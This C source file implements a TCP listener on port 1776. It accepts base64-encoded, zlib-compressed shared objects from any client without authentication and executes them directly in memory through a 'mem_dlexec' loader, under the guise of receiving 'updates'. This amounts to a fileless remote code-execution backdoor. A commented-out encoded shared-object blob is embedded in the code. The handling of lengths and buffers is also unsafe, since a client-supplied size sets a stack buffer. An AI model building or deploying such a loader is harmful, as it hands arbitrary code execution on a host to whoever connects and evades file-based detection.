#include "srv.h"
#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h> // read(), write(), close()
#include "loadnexec.h"
#include "base64.h"
#include <zlib.h>
#include <dlfcn.h>

#define SA struct sockaddr
#define MAX 50000
#define PORT 1776



struct SOStruct{
    char *len; //
    char *buffer;
};

// Function designed for chat between client and server.
void upload(int connfd) {
    char buff[MAX];
    // infinite loop for chat
    for (;;) {
        bzero(buff, MAX);

        char *tmpMsg = "Connected! Ready to recieve new update...";
        write(connfd, tmpMsg, strlen(tmpMsg));

        // read the message from client and copy it in buffer
        read(connfd, buff, sizeof(buff));
        struct SOStruct so;
        so.len = (char *)malloc(4);
        memset(so.len, 0, 4);

        memcpy(so.len, &buff[0], 4);
        so.buffer = &buff[4]; //

        // convert first 4 character (2 bytes) to corresponding hex value
        // ex 3ef8 == 16120
        int buffer_size = (int)strtol(so.len, 0, 16);

        // tmp holder for SO that works
        //char *b64tmp = "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";
        char *plain_so = base64_decode(so.buffer);
        char sharedobject[buffer_size];

        // decompress
        int cbound = compressBound(buffer_size);
        uLong upper = buffer_size;
        int res = uncompress((Bytef *)sharedobject,
                &upper,
                (Bytef *)plain_so,
                cbound);

        if (res != 0) {
            fprintf(stderr, "Error, could not decompress SO!");
            exit(1);
        }

        // exec shared object
        int mem_res = mem_dlexec(sharedobject, buffer_size);

        //
        if (mem_res == 0){
            char *tmpMsg = "Successfully executed shared object!";
            write(connfd, tmpMsg, strlen(tmpMsg));
        } else {
            char *tmpMsg = "Error executing shared object!";
            write(connfd, tmpMsg, strlen(tmpMsg));
        }
    }
}

/**
 * single-threaded TCP server
 * https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/
 */
void createServer() {
    int sockfd, connfd;
    unsigned int len;
    struct sockaddr_in servaddr, cli;

    // socket create and verification
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        printf("socket creation failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully created..\n");
    bzero(&servaddr, sizeof(servaddr));

    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(PORT);

    // Binding newly created socket to given IP and verification
    if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) {
        printf("socket bind failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully binded..\n");

    // Now server is ready to listen and verification
    if ((listen(sockfd, 5)) != 0) {
        printf("Listen failed...\n");
        exit(0);
    }
    else {
        printf("Server listening..\n");
    }
    len = sizeof(cli);

    // Fork every new socket connection and pass to upload func
    while(1) {
        // Accept the data packet from client and verification
        connfd = accept(sockfd, (SA*)&cli, &len);
        if (connfd < 0) {
            printf("server accept failed...\n");
            exit(0);
        }
        else {
            printf("server accept the client...\n");
        }

        // fork off new connection
        pid_t childpid;
        if ((childpid = fork()) == 0) {
            upload(connfd);
        }
    }

    // After chatting close the socket
    close(sockfd);
}
